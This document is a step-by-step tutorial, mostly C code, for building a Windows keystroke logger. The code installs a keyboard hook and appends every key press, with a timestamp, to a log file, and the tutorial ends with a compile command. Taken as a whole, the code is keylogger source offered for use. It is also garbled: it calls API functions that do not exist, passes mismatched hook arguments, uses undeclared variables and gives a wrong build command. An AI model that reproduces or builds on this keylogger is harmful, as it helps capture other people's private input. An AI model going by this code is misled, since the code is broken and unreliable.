### Step 1: Include Necessary Headers
Include the required Windows API headers:
```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <ctime>
```

### Step 2: Define the Keyboard Hook Function
Define a function to handle keyboard events:
```c
#define KEYHOOKPROCEDURE
void CALLBACK KeyboardHook(HWND hwnd, int wEvent, int wKey, int dwExtraInfo, int dwKeySpec) {
    static FILE *file;
    static char path[255];
    static char logFile[255];

    // Initialize file pointers and log file paths
    if (!file) {
        time(&now);
        snprintf(logFile, sizeof(logFile), "KeystrokeLog_%d.txt", time(0));
        fopen_s(&file, logFile, "a");

        // Open the file in append mode
        if (!file) {
            // Handle file opening errors
            printf("Failed to create log file!\n");
            return;
        }
    }

    // Process each key press
    if (wEvent == KEYDOWN) {
        unsigned char key = static_cast<unsigned char>(wKey);
        // Convert key to character if necessary
        char charKey = (key >= 32) ? (char)key : '\0';
        // Write to file
        fprintf(file, "[%s] %c\n", getCurrentTimeString(), charKey);
        // Echo to console
        printf("Key pressed: %c\n", charKey);
    }
}
```

### Step 3: Set Up the Keyboard Hook
Use `SetWindowsHook` to install the hook:
```c
int main() {
    HWND hwnd = GetMainWindow();
    HHOOK hKeyboardHook;

    // Set up the hook
    hKeyboardHook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyboardHook);

    if (hKeyboardHook == NULL) {
        printf("Failed to set keyboard hook!\n");
        return 1;
    }

    // Attach the hook
    if (!AttachConsoleToWindow(hwnd)) {
        printf("Failed to attach console!\n");
        return 2;
    }

    // Process messages
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        if (msg.wParam == WM_KEYDOWN) {
            KeyboardHook(msg.hwnd, msg.wParam, 0, 0, msg.wKey, 0);
        }
    }

    // Clean up
    UnhookWindowsHook(hKeyboardHook);
    RemoveMessageQueue(hwnd);
    return 0;
}
```

### Step 4: Clean Up Functions
Implement functions to handle cleanup:
```c
void CALLBACK CloseHook(HWND hwnd) {
    // Close the file if it exists
    if (file) {
        fclose(file);
        file = NULL;
    }
    // Remove the hook
    UnhookWindowsHook(hKeyboardHook);
}
```

### Step 5: Compile and Run
Compile the code with the necessary libraries:
```cmd
// Compile with:
// - Use C99 features, so add /TC option if using older compiler
gcc -O2 -link windows.h -lkernel32 -luser32 -mwindows -o keystrokeLogger.exe keyboard_hook.c
```

